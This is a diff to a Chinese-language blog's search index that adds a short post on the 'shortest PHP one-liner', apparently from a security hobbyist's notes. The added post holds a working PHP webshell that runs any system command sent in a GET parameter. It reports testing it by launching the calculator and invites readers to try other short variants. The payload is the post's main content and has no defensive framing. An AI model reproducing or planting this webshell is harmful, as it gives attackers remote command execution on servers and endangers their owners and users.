@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>php最短一句话</title>
+      <link href="/2023/04/11/php-zui-duan-yi-ju-hua/"/>
+      <url>/2023/04/11/php-zui-duan-yi-ju-hua/</url>
+      
+        <content type="html"><![CDATA[<p>php最短一句话如下:</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br></pre></td></tr></tbody></table></figure><p>作用相当于执行系统命令:</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20230411225445368.png" alt="测试一句话打开计算器"></p><p>可以看到，成功执行了<code>calc</code>这系统命令，打开了系统计算器。</p><p>看到一个知识星球上说下面这两个超短一句话也可以：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20230411225947619.png" alt="另外两个一句话"></p><p>我用的php5.5.9的版本试了一下没能成功，不知道是不是这个版本问题，有兴趣的小伙伴也可以自己试试。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 小记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 一句话 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>我的博客搭建</title>
       <link href="/2023/04/05/wo-de-bo-ke/"/>
       <url>/2023/04/05/wo-de-bo-ke/</url>
